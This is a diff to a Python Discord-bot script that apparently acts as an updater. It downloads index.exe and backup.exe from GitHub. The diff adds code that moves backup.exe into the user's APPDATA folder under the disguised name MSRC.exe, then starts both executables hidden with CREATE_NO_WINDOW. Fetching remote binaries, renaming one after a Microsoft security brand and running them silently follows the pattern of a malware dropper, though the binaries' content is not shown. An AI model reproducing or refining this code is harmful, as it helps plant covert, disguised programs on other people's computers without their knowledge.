@@ -6,6 +6,7 @@ import discord
 import asyncio
 import dotenv
 import win32com.client
+import subprocess
 
 timeout = 1
 last_update_time = 0
@@ -108,15 +109,52 @@ async def kill_process(process_name):
 async def handle_file_operations():
     """Handle file operations like replacing and starting the file."""
     try:
-        os.replace("index.exe", "C:/announcer/index.exe")
-        print("File replaced successfully.")
-        os.replace("backup.exe", "%appdata%/MSRC.exe")
-        os.startfile("C:/announcer/index.exe")
-        print("File index.exe started successfully.")
-        os.startfile("%appdata%/MSRC.exe")
-        print("File backup.exe started successfully.")
-    except FileNotFoundError:
-        print("File not found during replace or start operation.")
+        cwd = os.getcwd()
+        src_index = os.path.join(cwd, "index.exe")
+        dst_index = r"C:\announcer\index.exe"
+        os.makedirs(os.path.dirname(dst_index), exist_ok=True)
+
+        if os.path.exists(src_index):
+            os.replace(src_index, dst_index)
+            print("index.exe replaced successfully.")
+        else:
+            print("index.exe not found in current directory:", src_index)
+
+        src_backup = os.path.join(cwd, "backup.exe")
+        appdata = os.getenv("APPDATA")
+        if not appdata:
+            raise RuntimeError("APPDATA environment variable not set")
+        dst_backup = os.path.join(appdata, "MSRC.exe")
+
+        if os.path.exists(src_backup):
+            # ensure destination folder exists (APPDATA always exists, but keep check)
+            os.makedirs(os.path.dirname(dst_backup), exist_ok=True)
+            os.replace(src_backup, dst_backup)
+            print(f"backup.exe moved to {dst_backup}")
+        else:
+            print("backup.exe not found in current directory:", src_backup)
+
+        # Start programs using subprocess (non-blocking). Use CREATE_NO_WINDOW on Windows.
+        def try_start(path):
+            if not os.path.exists(path):
+                print(f"Cannot start, file missing: {path}")
+                return False
+            try:
+                creation_flags = 0
+                if os.name == "nt" and hasattr(subprocess, "CREATE_NO_WINDOW"):
+                    creation_flags = subprocess.CREATE_NO_WINDOW
+                subprocess.Popen([path], cwd=os.path.dirname(path), creationflags=creation_flags, close_fds=True)
+                print(f"Started {os.path.basename(path)} via subprocess")
+                return True
+            except Exception as e:
+                print(f"Failed to start {path} via subprocess: {e}")
+                return False
+
+        try_start(dst_index)
+        try_start(dst_backup)
+
+    except FileNotFoundError as e:
+        print("File not found during replace or start operation:", e)
     except Exception as e:
         print(f"Error during file operations: {e}")
 
@@ -153,7 +191,7 @@ async def on_ready():
     await download_file(url_index, filename_index)
 
     # Download backup.exe
-    url_backup = "https://github.com/Plexisity/announcer/raw/main/backup.exe"
+    url_backup = "https://github.com/Plexisity/announcer/raw/refs/heads/main/backup.exe"
     filename_backup = "backup.exe"
     if os.path.exists(filename_backup):
         print(f"File {filename_backup} already exists. Deleting it...")
